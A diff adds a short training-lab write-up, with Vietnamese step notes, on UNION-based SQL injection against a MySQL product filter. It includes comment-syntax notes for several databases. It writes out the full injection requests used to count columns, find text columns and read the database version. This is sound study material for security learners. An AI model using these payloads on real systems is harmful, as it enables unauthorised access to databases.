@@ -1,0 +1,24 @@
+This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+
+To solve the lab, display the database version string.
+
+1. Xác định bảng có bao nhiêu cột
+GET /filter?category='+union+select+null,null# HTTP/1.1
+
+Comments
+You can use comments to truncate a query and remove the portion of the original query that follows your input.
+
+Oracle	--comment
+Microsoft	--comment
+/*comment*/
+PostgreSQL	--comment
+/*comment*/
+MySQL	#comment
+-- comment [Note the space after the double dash]
+/*comment*/
+-> bảng có 2 cột, nhớ MySQL comment là dấu #
+2. Xác định cột nào có kiểu dữ liệu text
+GET /filter?category='+union+select+'asdf','test'# HTTP/1.1
+-> 2 cột có kiểu dữ liệu text
+3. Xác định version của csdl MySQL
+GET /filter?category='+union+select+@@version,null# HTTP/1.1
